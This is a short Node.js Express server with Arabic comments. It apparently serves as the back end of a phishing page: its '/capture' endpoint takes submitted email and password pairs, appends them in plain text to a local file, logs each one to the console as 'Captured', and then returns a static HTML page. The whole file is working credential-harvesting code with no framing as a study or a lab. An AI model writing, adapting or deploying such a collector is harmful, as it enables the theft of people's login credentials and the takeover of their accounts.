const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware لقراءة البيانات القادمة من النموذج
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// خدمة ملفات HTML الثابتة
app.use(express.static(path.join(__dirname, 'public')));

// المسار الذي سيتم حفظ البيانات فيه
const dataFile = path.join(__dirname, 'data.txt');

// نقطة الاستقبال (Endpoint)
app.post('/capture', (req, res) => {
    const { email, pass } = req.body;
    
    if (email && pass) {
        const logEntry = `[${new Date().toLocaleString()}] Email: ${email} | Pass: ${pass}\n`;
        
        // إضافة البيانات للملف
        fs.appendFileSync(dataFile, logEntry);
        console.log(`Captured: ${email} / ${pass}`);
    }
    
    // إرجاع صفحة HTML للسارق بعد الإرسال
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
